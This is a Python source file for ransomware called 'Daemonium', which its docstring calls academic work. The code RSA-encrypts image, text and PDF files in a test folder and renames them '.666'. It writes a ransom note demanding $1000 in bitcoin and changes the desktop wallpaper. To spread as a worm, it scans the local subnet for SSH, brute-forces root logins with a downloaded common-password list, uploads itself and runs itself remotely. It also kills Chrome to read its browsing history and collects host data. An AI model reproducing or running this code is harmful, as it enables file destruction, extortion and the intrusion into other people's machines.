import os
import platform
import socket
import sqlite3
import subprocess
import threading
import time
import urllib.error
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Any, Dict
from urllib.request import urlretrieve
import netifaces
import nmap
import paramiko
import psutil
import requests
from Crypto import Cipher
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from dataclasses import dataclass
from Crypto.PublicKey.RSA import RsaKey


@dataclass
class Daemonium:
    """
    This is a cryptographic ransomware
    IT's ONLY A ACADEMIC WORK

    Functions:
    - encrypt filesystem
    - detect simple parsing
    - uses RSA asymmetric encryption
    - capture basic computer data
    """
    def __init__(self):
        self.__files: List[str] = [
            ".jpg", ".png", ".txt", ".pdf"
        ]
        self.__public_key: bytes or None = None
        self.__BLOCK_SIZE: hex = 0xA0
        self.__public_key_path: str = '../../Keys/public_key.pem'
        self.__count: int = 0
        self.__content: List[Any] = []
        self.__data: Dict[str, Any] = {}

    def __write_readme(self) -> None:
        with open(os.path.join(os.path.expanduser('~'), r'Desktop/README.txt'), 'w', encoding='latin1') as file:
            file.write("""Many of your important files have been encrypted by RANSOMWARE DAEMONIUM so that recovery is 
            impossible without the key. But don't worry, if after 72h you make the payment of $1000 to the 
            XXXXXX bitcoin card, we will send you the key to get you back your normal life without worries.""")
        self._change_wallpaper()

    def __get_public_key(self) -> RsaKey:
        with open(self.__public_key_path, 'rb') as f:
            self.__public_key = RSA.import_key(f.read())
        return self.__public_key

    @staticmethod
    def _change_wallpaper() -> None:
        try:

            url = "https://pixabay.com/get/g17741f6fb5fb3daa1813632c227adf15e9a705f5602414833741446596a86b4ec01f3efc244f21b9c603b3bbeddf978b42e0e4a8d778e65927c563fd47afea6629bc9c3e040b00328981dacd6262298f_1920.jpg"
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
            }

            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                with open("daemonium.jpg", "wb") as f:
                    f.write(response.content)
            else:
                ...
        except urllib.error.HTTPError:
            ...
        else:
            time.sleep(5)
            try:
                subprocess.Popen([
                    "gsettings", "set", "org.gnome.desktop.background", "picture-uri",
                    "file://" + os.getcwd() + "/daemonium.jpg"
                ])
                os.system(f" gsettings set org.gnome.desktop.background picture-uri file://{new_wallpaper_path}")

            except Exception as e:
                print(e)

    def __get_cipher(self) -> Cipher:
        return PKCS1_OAEP.new(self.__get_public_key())

    def __rename_file(self, file: str) -> None:
        os.rename(file, file + ".666")

    def __find_files(self) -> None:
        home: str = os.path.join(os.path.expanduser('~'), r'Documents/ransomTests')
        threads = []
        for root, dirs, files in os.walk(home):
            for names in files:
                if Path(os.path.join(root, names)).suffix in self.__files:
                    threads.append(threading.Thread(target=self.__encrypt, args=(os.path.join(root, names), )))
        [thread.start() for thread in threads]
        [thread.join() for thread in threads]

    def __encrypt(self, file: str) -> None:
        encrypted_data = bytearray()
        cipher = self.__get_cipher()

        with open(file, 'rb') as f:
            print(f"[+] Encrypting {file}")
            while True:
                chunk = f.read(self.__BLOCK_SIZE)
                if not chunk:
                    break
                try:
                    encrypted_chunk = cipher.encrypt(chunk)
                    encrypted_data.extend(encrypted_chunk)
                    self.__count += 1
                except Exception as e:
                    ...

        with open(file, 'wb') as f:
            f.write(encrypted_data)
            self.__rename_file(file)

    def __get_hosts(self) -> List[str]:
        nm = nmap.PortScanner()
        nm.scan(hosts=f'{self.__get_ip_address()}/24', arguments='-p 22')
        return nm.all_hosts()

    @classmethod
    def __get_ip_address(cls) -> str:
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]

    @classmethod
    def __get_ssh_passwords(cls) -> None:
        url: str = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/" \
                   "Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
        urlretrieve(url, "passwords.txt")

    @staticmethod
    def __ssh_connect(host: str, password: str) -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        try:
            client.connect(host, 22, "root", password, timeout=10)
            stdin, stdout, stderr = client.exec_command("whoami")
            username = stdout.readline().strip()
            sftp = client.open_sftp()
            sftp.put("daemonium.py", f"/home/{username}/Documents/")  # initialization of system
            time.sleep(0.5)
            client.exec_command(f"python /home/{username}/Documents/daemonium.py")
            return True
        except socket.error:
            # 22 port is not opened
            return False
        except paramiko.ssh_exception.AuthenticationException:
            # wrong credentials error
            return False
        except paramiko.ssh_exception.SSHException:
            # socket is open, but not SSH service responded
            return False

    def __ssh_brute_force(self) -> None:
        try:
            files = []
            with open("passwords.txt", 'r', encoding='latin1') as file:
                files.append(file.readlines())
            for host in self.__get_hosts():
                for pw in files[0]:
                    if self.__ssh_connect(host, pw.strip()):
                        ...
        except Exception as e:
            ...

    def __get_chrome_history(self):
        for proc in psutil.process_iter():
            try:
                # verifica se o processo é o Google Chrome
                if "chrome" in proc.name().lower():
                    proc.kill()  # encerra o processo
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        try:
            path = os.path.expanduser("~/.config/google-chrome/Default/History")
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            query = "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;"
            cursor.execute(query)
            results = cursor.fetchall()
            epoch = datetime(1601, 1, 1)
            delta = timedelta(microseconds=1)
            for url, title, last_visit_time in results:
                last_visit_time = epoch + delta * last_visit_time
                self.__content.append(f"{last_visit_time}: {title} ({url})")
            cursor.close()
            conn.close()
        except Exception:
            ...

    def __get_victim_info(self) -> None:
        self.__data["hostname"] = socket.gethostname()
        self.__data['system_release'] = platform.release()
        self.__data['SO'] = platform.system()
        self.__data['disk'] = psutil.disk_usage('/')
        self.__data['memory'] = psutil.virtual_memory()
        self.__data['cpu'] = psutil.cpu_stats()
        self.__data['infected_files'] = self.__count
        self.__data['history_browser'] = self.__content

    def __worm_function(self) -> None:
        self.__ssh_brute_force()
        self.__get_victim_info()

    def run(self) -> None:
        self.__find_files()
        print(f"Trying to spread myself...")
        self.__worm_function()
        self.__write_readme()


if __name__ == '__main__':
    ransomware: Daemonium = Daemonium()
    ransomware.run()
